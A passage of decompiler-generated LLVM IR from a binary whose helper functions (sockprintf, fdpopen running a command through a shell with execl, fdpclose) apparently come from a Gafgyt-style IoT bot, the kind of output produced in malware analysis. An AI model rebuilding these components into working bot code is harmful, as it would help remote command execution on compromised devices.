  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1adbc.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_2a5e8.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_2a5e8.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1adc4.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1adc4.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_1aa08.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_1adcc.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_2a5e8.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_2a5e8.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
